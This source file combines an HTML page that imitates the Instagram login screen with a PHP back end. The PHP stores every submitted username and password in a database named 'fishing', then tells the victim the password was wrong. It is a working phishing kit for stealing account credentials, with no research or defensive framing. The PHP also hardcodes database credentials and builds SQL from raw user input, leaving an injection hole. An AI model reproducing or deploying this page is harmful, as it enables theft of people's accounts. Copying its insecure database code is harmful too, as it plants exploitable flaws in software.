<!DOCTYPE html>
<html class="no-js">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>Login • Instagram</title>
    <meta name="description" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="icon" sizes="192x192" href="favicon.png" />
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div id="wrapper">
      <div class="container">
        <div class="phone-app-demo">
          <img src="images/mobiledevices.png" alt="mobile devices" />
          <div id="screenshots">
            <img class="bottom" src="images/screenshot1.jpg" alt="" />
            <img class="top" src="images/screenshot2.jpg" alt="" />
          </div>
        </div>
        <div class="form-data">
          <form action="loginpage2.php" method="post">
            <div class="logo">
              <img src="images/logo.png" alt="logo" />
            </div>
            <input type="text" name="account" placeholder="Phone number, username, or email" />
            <input type="password" name="password"  placeholder="Password" />
            <button class="form-btn" type="submit">Log in</button>
            <a class="password-reset" href="#">Forgot password?</a>
            <br>
            <div class="eiCW-"><p aria-atomic="true" id="slfErrorAlert" role="alert" style="color:red">Sorry, your password was incorrect. Please double-check your password.</p></div>
          </form>
          <div class="sign-up">
            Don't have an account? <a href="#">Sign up</a>
          </div>
          <div class="get-the-app">
            <span>Get the app.</span>
            <div class="badges">
              <img src="images/appstorebtn.png" alt="" />
              <img src="images/googleplaybtn.png" alt="" />
            </div>
          </div>
        </div>
      </div>
      <footer>
        <div class="container">
          <nav class="footer-nav">
            <ul>
              <li><a href="#">About us</a></li>
              <li><a href="#">Support</a></li>
              <li><a href="#">Press</a></li>
              <li><a href="#">API</a></li>
              <li><a href="#">Jobs</a></li>
              <li><a href="#">Privacy</a></li>
              <li><a href="#">Terms</a></li>
              <li><a href="#">Directory</a></li>
              <li><a href="#">Profiles</a></li>
              <li><a href="#">Hashtags</a></li>
              <li><a href="#">Languages</a></li>
            </ul>
          </nav>
          <div class="copyright-notice">&copy; 2019 Instagram</div>
        </div>
      </footer>
    </div>
    <script src="https://kit.fontawesome.com/0ea7e7134a.js"></script>
  </body>
</html>




<?php

$servername = "localhost";
$username = "lawrence910426";
$password = "2rjurrru";
$dbname = "fishing";
@$account2 = $_POST["account"];
@$password2 = $_POST["password"];
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
$sql = "INSERT INTO `a`(`account`, `password`) VALUES ('$account2','$password2')";

if ($conn->query($sql) === TRUE) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}
echo("Wrong password.");
$conn->close();

?>

